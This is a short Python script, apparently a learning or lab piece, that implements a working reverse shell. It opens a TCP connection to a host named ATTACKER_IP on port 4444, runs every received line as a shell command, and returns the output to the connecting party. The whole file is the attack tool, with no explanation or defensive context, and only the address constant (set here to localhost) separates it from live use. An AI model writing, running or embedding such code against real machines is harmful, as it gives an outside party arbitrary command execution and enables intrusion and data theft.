import socket
import subprocess

ATTACKER_IP = "127.0.0.1"
ATTACKER_PORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ATTACKER_IP, ATTACKER_PORT))

while True:
    cmd_buffer = b""

    while b"\n" not in cmd_buffer:
        chunk = sock.recv(1024)
        # print(f"chunk: {chunk}")
        if not chunk:
            sock.close()
            exit()
        cmd_buffer += chunk

    # print(f"Sending {len(cmd_buffer)} bytes")

    command = cmd_buffer.decode().strip()
    # print(f"command : {command}")

    if command == "exit":
        break

    proc = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    output = proc.stdout.read() + proc.stderr.read()
    if not output:
        output = b"\n"

    sock.sendall(output)

sock.close()